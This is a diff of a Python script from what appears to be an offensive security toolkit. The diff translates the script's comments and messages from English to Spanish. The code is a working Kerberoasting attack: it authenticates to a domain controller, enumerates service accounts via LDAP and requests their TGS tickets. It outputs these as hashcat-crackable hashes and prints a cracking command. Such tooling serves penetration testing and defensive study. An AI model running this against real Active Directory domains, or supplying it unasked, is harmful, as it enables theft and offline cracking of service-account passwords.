@@ -1,10 +1,10 @@
 # scripts/kerberos/extraction/kerberoasting.py
 """
-Kerberoasting — request TGS for accounts with SPN and output
-hashcat -m 13100 format ($krb5tgs$23$...).
+Kerberoasting — solicita TGS para cuentas con SPN y genera
+hashes en formato hashcat -m 13100 ($krb5tgs$23$...).
 
-Uses impacket's getKerberosTGT + getKerberosTGS pipeline,
-identical to impacket/examples/GetUserSPNs.py.
+Usa el pipeline getKerberosTGT + getKerberosTGS de impacket,
+idéntico a impacket/examples/GetUserSPNs.py.
 """
 
 from core.output import console
@@ -25,16 +25,16 @@ except ImportError:
 
 def _format_hash(spn, username, realm, tgs_rep_blob):
     """
-    Build the hashcat -m 13100 string from the raw TGS-REP DER bytes.
-    Mirrors GetUserSPNs.py output exactly.
+    Construye el string hashcat -m 13100 a partir de los bytes DER del TGS-REP.
+    Replica exactamente la salida de GetUserSPNs.py.
     """
     decoded     = decoder.decode(tgs_rep_blob, asn1Spec=TGS_REP())[0]
     ticket_enc  = decoded["ticket"]["enc-part"]
     etype       = int(ticket_enc["etype"])
     cipher      = bytes(ticket_enc["cipher"])
 
-    # RC4-HMAC (23): first 16 bytes = checksum, rest = data
-    # AES (17/18): same split convention for hashcat
+    # RC4-HMAC (23): primeros 16 bytes = checksum, el resto = datos
+    # AES (17/18): misma convención de división para hashcat
     checksum = cipher[:16].hex()
     data     = cipher[16:].hex()
 
@@ -55,13 +55,13 @@ class Script(BaseScript):
     protocol    = "kerberos"
     category    = "extraction"
     description = (
-        "Request TGS for SPN accounts and output hashcat -m 13100 hashes. "
-        "Requires valid credentials."
+        "Solicita TGS para cuentas con SPN y genera hashes hashcat -m 13100. "
+        "Requiere credenciales válidas."
     )
 
     def run(self, **kwargs):
         if not _IMPACKET_OK:
-            console.print("[red]impacket not installed.[/red]")
+            console.print("[red]impacket no está instalado.[/red]")
             return None
 
         ip       = self.target.ip
@@ -72,15 +72,15 @@ class Script(BaseScript):
         spn_arg  = kwargs.get("spn", "")
 
         if not domain or not user:
-            console.print("[red]Requires: -d <domain> -u <user> and -p or -H[/red]")
+            console.print("[red]Requiere: -d <dominio> -u <usuario> y -p o -H[/red]")
             return None
 
         lm_hash = ""
         if nt_hash and ":" in nt_hash:
             lm_hash, nt_hash = nt_hash.split(":", 1)
 
-        # ── 1. Get TGT ────────────────────────────────────────────────────────
-        console.print(f"[dim][kerberoasting] Getting TGT for {user}@{domain}...[/dim]")
+        # ── 1. Obtener TGT ───────────────────────────────────────────────────────
+        console.print(f"[dim][kerberoasting] Obteniendo TGT para {user}@{domain}...[/dim]")
         try:
             tgt, cipher, old_session_key, session_key = getKerberosTGT(
                 clientName = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value),
@@ -92,16 +92,16 @@ class Script(BaseScript):
                 kdcHost    = ip,
             )
         except Exception as e:
-            console.print(f"[red]TGT failed: {e}[/red]")
+            console.print(f"[red]TGT falló: {e}[/red]")
             return None
 
-        # ── 2. Find SPNs (LDAP) or use the one provided ───────────────────────
+        # ── 2. Buscar SPNs (LDAP) o usar el proporcionado ────────────────────────
         spn_accounts = []
 
         if spn_arg:
             spn_accounts = [(user, spn_arg)]
         else:
-            console.print("[dim][kerberoasting] Enumerating SPN accounts via LDAP...[/dim]")
+            console.print("[dim][kerberoasting] Enumerando cuentas SPN vía LDAP...[/dim]")
             try:
                 ldap_conn = ldap.LDAPConnection(f"ldap://{ip}", domain, ip)
                 ldap_conn.login(user, passwd, domain, lm_hash, nt_hash)
@@ -131,15 +131,15 @@ class Script(BaseScript):
                     if sam and spns:
                         spn_accounts.append((sam, spns[0]))
             except Exception as e:
-                console.print(f"[yellow]LDAP enum failed: {e}[/yellow]")
+                console.print(f"[yellow]Enumeración LDAP falló: {e}[/yellow]")
 
         if not spn_accounts:
-            console.print("[yellow]No SPN accounts found.[/yellow]")
+            console.print("[yellow]No se encontraron cuentas SPN.[/yellow]")
             return None
 
-        console.print(f"[dim][kerberoasting] {len(spn_accounts)} SPN account(s) found. Requesting TGS...[/dim]\n")
+        console.print(f"[dim][kerberoasting] {len(spn_accounts)} cuenta(s) SPN encontradas. Solicitando TGS...[/dim]\n")
 
-        # ── 3. Request TGS and format hash ────────────────────────────────────
+        # ── 3. Solicitar TGS y formatear hash ────────────────────────────────────
         hashes = []
         for sam, spn in spn_accounts:
             try:
@@ -168,7 +168,7 @@ class Script(BaseScript):
                 console.print(f"  [red]✗[/red] {sam} ({spn}): {e}")
 
         if hashes:
-            console.print(f"[bold green]{len(hashes)} hash(es) obtained.[/bold green]")
-            console.print("[dim]Crack with: hashcat -m 13100 hashes.txt wordlist.txt[/dim]")
+            console.print(f"[bold green]{len(hashes)} hash(es) obtenido(s).[/bold green]")
+            console.print("[dim]Crackear con: hashcat -m 13100 hashes.txt wordlist.txt[/dim]")
 
         return [h[2] for h in hashes] or None
